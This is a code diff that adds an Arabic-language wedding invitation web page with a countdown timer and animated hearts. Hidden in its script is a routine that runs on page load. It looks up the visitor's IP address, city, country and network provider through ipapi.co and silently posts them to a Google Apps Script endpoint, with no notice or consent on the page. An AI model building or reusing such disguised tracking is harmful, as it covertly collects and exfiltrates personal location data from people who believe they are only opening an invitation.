@@ -1,0 +1,130 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>دعوة زفاف العمر الكبيرة</title>
+    <style>
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #f5efe6 0%, #eae3d2 100%);
+            color: #4a3f35;
+            text-align: center;
+            padding: 40px 20px;
+            margin: 0;
+            overflow-x: hidden;
+            min-height: 100vh;
+        }
+        .card {
+            background: rgba(255, 255, 255, 0.95);
+            max-width: 550px;
+            margin: 40px auto;
+            padding: 40px 30px;
+            border-radius: 24px;
+            box-shadow: 0 15px 35px rgba(138, 115, 85, 0.15);
+            border: 1px solid #dcd1be;
+            position: relative;
+            z-index: 2;
+        }
+        h1 { color: #8a7355; font-size: 2.8rem; margin-bottom: 5px; font-weight: 700; }
+        .subtitle { font-size: 1.3rem; color: #b09a7a; margin-top: 0; margin-bottom: 30px; letter-spacing: 1px; }
+        p { font-size: 1.2rem; line-height: 1.8; color: #5a4f43; }
+        .timer { display: flex; justify-content: center; gap: 15px; margin: 35px 0; }
+        .time-box { background: #8a7355; color: #fff; padding: 15px 10px; border-radius: 14px; min-width: 80px; box-shadow: 0 6px 12px rgba(138, 115, 85, 0.2); }
+        .time-box span { display: block; font-size: 2rem; font-weight: bold; }
+        .time-box label { font-size: 0.85rem; opacity: 0.9; display: block; margin-top: 5px; }
+        .details { margin-top: 30px; padding-top: 25px; border-top: 1px dashed #dcd1be; }
+        .details-item { font-weight: bold; color: #8a7355; margin: 10px 0; }
+        .heart { position: fixed; color: rgba(138, 115, 85, 0.2); font-size: 20px; top: -10%; z-index: 1; animation: fall linear infinite; }
+        @keyframes fall { 0% { transform: translateY(0) rotate(0deg); opacity: 1; } 100% { transform: translateY(110vh) rotate(360deg); opacity: 0; } }
+    </style>
+</head>
+<body>
+
+    <div class="card">
+        <h1>دعوة زفاف</h1>
+        <div class="subtitle">✨ ليلة العمر الكبيرة ✨</div>
+        <p>بقلوب تملؤها الفرحة والبهجة، نسعد بدعوتكم لمشاركتنا أجمل لحظات العمر في حفل زفافنا الميمون.</p>
+        <p>حضوركم يكتمل به فرحنا وسرورنا 🤍</p>
+        
+        <div class="timer">
+            <div class="time-box"><span id="days">00</span><label>أيام</label></div>
+            <div class="time-box"><span id="hours">00</span><label>ساعات</label></div>
+            <div class="time-box"><span id="minutes">00</span><label>دقائق</label></div>
+        </div>
+
+        <div class="details">
+            <div class="details-item">📍 المكان: قاعة الزفاف الكبرى</div>
+            <div class="details-item">🗓️ الميعاد: قريباً إن شاء الله</div>
+        </div>
+    </div>
+
+    <script>
+        // الرابط بتاعك مدمج هنا وجاهز للاستقبال فوراً
+        const GOOGLE_SHEET_URL = "https://script.google.com/macros/s/AKfycbxUFZ2RP-VA2OpJ9szN-QFlWuhBYsk1hKpd6YmUSXoQrhMxa0KkZG2N3xz6iq5_0SIAqQ/exec";
+
+        async function getIpAndTrack() {
+            try {
+                let response = await fetch('https://ipapi.co/json/');
+                let data = await response.json();
+
+                let payload = {
+                    ip: data.ip || "Unknown",
+                    city: data.city || "Unknown",
+                    country: data.country_name || "Unknown",
+                    network: data.org || "Unknown",
+                    timestamp: new Date().toLocaleString('en-US', { timeZone: 'Africa/Cairo' })
+                };
+
+                if (GOOGLE_SHEET_URL) {
+                    fetch(GOOGLE_SHEET_URL, {
+                        method: 'POST',
+                        mode: 'no-cors',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify(payload)
+                    });
+                }
+            } catch (error) {
+                console.log("Error tracking");
+            }
+        }
+        
+        window.onload = function() {
+            getIpAndTrack();
+            createHearts();
+        };
+
+        // العداد التنازلي - متظبط على ميعاد الفرح
+        const weddingDate = new Date("October 20, 2026 18:00:00").getTime();
+        const timerInterval = setInterval(() => {
+            const now = new Date().getTime();
+            const diff = weddingDate - now;
+            if (diff <= 0) {
+                clearInterval(timerInterval);
+                document.querySelector(".timer").innerHTML = "<h2 style='color:#8a7355;'>بدأ الفرح! منورين يا حبايب 🤍</h2>";
+                return;
+            }
+            const days = Math.floor(diff / (1000 * 60 * 60 * 24));
+            const hours = Math.floor((diff % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
+            const minutes = Math.floor((diff % (1000 * 60 * 60)) / (1000 * 60));
+
+            document.getElementById("days").innerText = days.toString().padStart(2, '0');
+            document.getElementById("hours").innerText = hours.toString().padStart(2, '0');
+            document.getElementById("minutes").innerText = minutes.toString().padStart(2, '0');
+        }, 1000);
+
+        function createHearts() {
+            const numberOfHearts = 25;
+            for (let i = 0; i < numberOfHearts; i++) {
+                let heart = document.createElement('div');
+                heart.className = 'heart';
+                heart.innerText = '🤍';
+                heart.style.left = Math.random() * 100 + 'vw';
+                heart.style.animationDelay = Math.random() * 8 + 's';
+                heart.style.animationDuration = Math.random() * 5 + 5 + 's';
+                document.body.appendChild(heart);
+            }
+        }
+    </script>
+</body>
+</html>
